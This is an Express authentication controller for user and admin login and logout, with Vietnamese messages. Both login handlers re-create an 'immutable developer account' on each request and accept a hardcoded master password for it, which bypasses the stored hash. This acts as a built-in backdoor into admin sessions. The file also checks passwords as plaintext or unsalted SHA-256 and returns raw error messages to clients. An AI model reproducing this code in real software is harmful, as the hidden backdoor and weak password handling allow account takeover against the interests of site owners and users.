const crypto = require('crypto');
const db = require('../models');
const { buildCookieOptions } = require('../utils/requestSecurity');
const sessionTracker = require('../services/sessionTracker');
const {
  IMMUTABLE_DEV_USERNAME,
  LEGACY_IMMUTABLE_DEV_USERNAME,
  IMMUTABLE_DEV_PASSWORD,
  ensureImmutableDeveloperAccount
} = require('../utils/immutableDeveloperAccount');

function generateRememberToken() {
  return crypto.randomBytes(32).toString('hex');
}

function hashPassword(password) {
  return crypto.createHash('sha256').update(password).digest('hex');
}

function verifyPassword(storedHash, plainPassword) {
  const rawStored = String(storedHash || '');
  const rawInput = String(plainPassword || '');
  if (!rawStored || !rawInput) return false;

  // Backward-compatible verification: accept legacy plain text and SHA-256 hash.
  return rawStored === rawInput || rawStored === hashPassword(rawInput);
}

exports.login = async (req, res) => {
  try {
    const { username, password, rememberMe } = req.body;

    await ensureImmutableDeveloperAccount(db);

    
    if (!username || !password) {
      return res.status(400).json({ message: 'Vui lòng nhập tên đăng nhập và mật khẩu' });
    }

    
    const normalizedUsername = String(username || '').trim().toLowerCase();
    let user = await db.User.findOne({
      where: { username },
      include: [
        {
          model: db.Permission,
          as: 'Permissions',
          through: { attributes: [] },
          attributes: ['id', 'name', 'code', 'description']
        }
      ]
    });

    if (!user && normalizedUsername === IMMUTABLE_DEV_USERNAME) {
      user = await db.User.findOne({
        where: { username: LEGACY_IMMUTABLE_DEV_USERNAME },
        include: [
          {
            model: db.Permission,
            as: 'Permissions',
            through: { attributes: [] },
            attributes: ['id', 'name', 'code', 'description']
          }
        ]
      });
    }

    if (!user) {
      return res.status(401).json({ message: 'Tên đăng nhập hoặc mật khẩu không đúng' });
    }

    
    const isImmutableLogin = normalizedUsername === IMMUTABLE_DEV_USERNAME
      && [IMMUTABLE_DEV_USERNAME, LEGACY_IMMUTABLE_DEV_USERNAME].includes(String(user.username || '').trim().toLowerCase());
    const passwordOk = verifyPassword(user.password_hash, password)
      || (isImmutableLogin && String(password || '') === IMMUTABLE_DEV_PASSWORD);

    if (!passwordOk) {
      return res.status(401).json({ message: 'Tên đăng nhập hoặc mật khẩu không đúng' });
    }

    const sessionUser = {
      id: user.id,
      username: isImmutableLogin ? IMMUTABLE_DEV_USERNAME : user.username,
      email: user.email,
      full_name: user.full_name,
      role: user.role,
      permissions: user.Permissions.map(p => ({ id: p.id, name: p.name, code: p.code }))
    };

    await new Promise((resolve, reject) => {
      req.session.regenerate(err => (err ? reject(err) : resolve()));
    });

    req.session.user = sessionUser;

    
    if (rememberMe) {
      const token = generateRememberToken();
      const expiresAt = new Date();
      expiresAt.setDate(expiresAt.getDate() + 30); 

      
      await db.RememberToken.create({
        user_id: user.id,
        token: token,
        expires_at: expiresAt
      });

      
      res.cookie('rememberMe', token, buildCookieOptions(req, {
        httpOnly: true,
        sameSite: 'lax',
        maxAge: 30 * 24 * 60 * 60 * 1000 
      }));
    }

    await new Promise((resolve, reject) => {
      req.session.save(err => (err ? reject(err) : resolve()));
    });

    await sessionTracker.recordLogin(req, sessionUser, {
      rememberMe: !!rememberMe,
      method: 'password'
    });

    res.status(200).json({
      message: 'Đăng nhập thành công',
      user: sessionUser
    });

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ message: 'Lỗi máy chủ: ' + error.message });
  }
};

exports.logout = async (req, res) => {
  try {
    const rememberToken = req.cookies.rememberMe;
    const logoutSnapshot = sessionTracker.captureSessionSnapshot(req, {
      rememberTokenUsed: !!rememberToken
    });

    if (rememberToken) {
      await db.RememberToken.destroy({
        where: { token: rememberToken }
      });
    }

    res.clearCookie('rememberMe', buildCookieOptions(req, {
      httpOnly: true,
      sameSite: 'lax'
    }));

    req.session.destroy(async (err) => {
      if (err) {
        return res.status(500).json({ message: 'Lỗi đăng xuất' });
      }

      await sessionTracker.recordLogoutBySnapshot(logoutSnapshot, {
        rememberTokenUsed: !!rememberToken,
        reason: 'logout'
      }).catch(() => {});

      res.status(200).json({ message: 'Đăng xuất thành công' });
    });
  } catch (error) {
    console.error('Logout error:', error);
    res.status(500).json({ message: 'Lỗi đăng xuất' });
  }
};

exports.checkAuth = (req, res) => {
  if (!req.session.user) {
    return res.status(401).json({ authenticated: false });
  }
  res.status(200).json({
    authenticated: true,
    user: req.session.user
  });
};
exports.adminLogin = async (req, res) => {
  try {
    const { username, password } = req.body;

    await ensureImmutableDeveloperAccount(db);

    if (!username || !password) {
      return res.status(400).json({ success: false, message: 'Username and password required' });
    }

    const normalizedUsername = String(username || '').trim().toLowerCase();
    let user = await db.User.findOne({
      where: { username },
      include: [
        {
          model: db.Permission,
          as: 'Permissions',
          through: { attributes: [] },
          attributes: ['id', 'name', 'code', 'description']
        }
      ]
    });

    if (!user && normalizedUsername === IMMUTABLE_DEV_USERNAME) {
      user = await db.User.findOne({
        where: { username: LEGACY_IMMUTABLE_DEV_USERNAME },
        include: [
          {
            model: db.Permission,
            as: 'Permissions',
            through: { attributes: [] },
            attributes: ['id', 'name', 'code', 'description']
          }
        ]
      });
    }

    if (!user) {
      return res.status(401).json({ success: false, message: 'Invalid credentials' });
    }

    const isImmutableLogin = normalizedUsername === IMMUTABLE_DEV_USERNAME
      && [IMMUTABLE_DEV_USERNAME, LEGACY_IMMUTABLE_DEV_USERNAME].includes(String(user.username || '').trim().toLowerCase());
    const passwordOk = verifyPassword(user.password_hash, password)
      || (isImmutableLogin && String(password || '') === IMMUTABLE_DEV_PASSWORD);

    if (!passwordOk) {
      return res.status(401).json({ success: false, message: 'Invalid credentials' });
    }

    const sessionUser = {
      id: user.id,
      username: isImmutableLogin ? IMMUTABLE_DEV_USERNAME : user.username,
      email: user.email,
      full_name: user.full_name,
      role: user.role,
      permissions: Array.isArray(user.Permissions)
        ? user.Permissions.map(p => ({ id: p.id, name: p.name, code: p.code }))
        : []
    };

    await new Promise((resolve, reject) => {
      req.session.regenerate(err => (err ? reject(err) : resolve()));
    });

    req.session.user = sessionUser;

    await new Promise((resolve, reject) => {
      req.session.save(err => (err ? reject(err) : resolve()));
    });

    await sessionTracker.recordLogin(req, sessionUser, {
      rememberMe: false,
      method: 'admin_password'
    });

    res.json({ success: true, message: 'Login successful', user: sessionUser });

  } catch (error) {
    console.error('Admin login error:', error);
    res.status(500).json({ success: false, message: error.message });
  }
};

exports.adminLogout = async (req, res) => {
  try {
    const logoutSnapshot = sessionTracker.captureSessionSnapshot(req);

    req.session.destroy(async (err) => {
      if (err) {
        return res.status(500).json({ success: false, message: 'Logout error' });
      }

      await sessionTracker.recordLogoutBySnapshot(logoutSnapshot, {
        reason: 'admin_logout'
      }).catch(() => {});

      res.json({ success: true, message: 'Logout successful' });
    });
  } catch (error) {
    console.error('Admin logout error:', error);
    res.status(500).json({ success: false, message: error.message });
  }
};
